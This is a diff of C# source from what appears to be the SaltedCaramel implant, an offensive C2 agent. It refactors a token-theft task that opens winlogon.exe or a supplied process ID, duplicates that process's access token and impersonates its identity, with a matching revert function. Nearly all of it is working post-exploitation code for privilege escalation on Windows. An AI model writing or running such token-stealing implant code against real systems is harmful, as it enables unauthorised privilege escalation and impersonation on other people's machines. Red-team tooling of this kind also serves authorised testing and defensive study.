@@ -4,27 +4,26 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
-namespace SaltedCaramel
+namespace SaltedCaramel.Tasks
 {
-    class Token
+    internal class Token
     {
         internal static IntPtr stolenHandle;
 
-
-        public static void StealToken(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task)
         {
-            int procId = 0;
-            SafeWaitHandle procHandle;
+            int procId;
+            IntPtr procHandle;
             if (task.@params == "")
             {
                 Process winlogon = Process.GetProcessesByName("winlogon")[0];
-                procHandle = new SafeWaitHandle(winlogon.Handle, true);
+                procHandle = winlogon.Handle;
                 Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
             }
             else
             {
                 procId = Convert.ToInt32(task.@params);
-                procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
+                procHandle = Process.GetProcessById(procId).Handle;
                 Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
             }
             IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
@@ -36,7 +35,7 @@ namespace SaltedCaramel
                 {
                     // Get handle to target process token
                     bool procToken = Win32.OpenProcessToken(
-                        procHandle.DangerousGetHandle(),            // ProcessHandle
+                        procHandle,                                 // ProcessHandle
                         (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
                         out tokenHandle);                           // TokenHandle
 
@@ -63,37 +62,41 @@ namespace SaltedCaramel
 
                         WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                         Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
-                        implant.PostResponse(new SCTaskResp(task.id, "Successfully impersonated " + ident.Name));
-                        ident.Dispose();
                         Win32.CloseHandle(tokenHandle);
-                        procHandle.Close();
-                        implant.SendComplete(task.id);
+                        Win32.CloseHandle(procHandle);
+
+                        task.status = "complete";
+                        task.message = "Successfully impersonated " + ident.Name;
+                        ident.Dispose();
                     }
                     catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                     {
                         Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
-                        implant.SendError(task.id, e.Message);
+                        task.status = "error";
+                        task.message = e.Message;
                     }
                 }
                 catch (Exception e) // Catch errors thrown by OpenProcessToken
                 {
                     Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
-                    implant.SendError(task.id, e.Message);
+                    task.status = "error";
+                    task.message = e.Message;
                 }
             }
             catch (Exception e) // Catch errors thrown by Process.GetProcessById
             {
                 Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
-                implant.SendError(task.id, e.Message);
+                task.status = "error";
+                task.message = e.Message;
             }
 
         }
 
-        internal static void Revert(SCTask task, SCImplant implant)
+        internal static void Revert(SCTaskObject task, SCImplant implant)
         {
             Win32.CloseHandle(stolenHandle);
             stolenHandle = IntPtr.Zero;
-            implant.SendComplete(task.id);
+            task.status = "complete";
         }
     }
 }
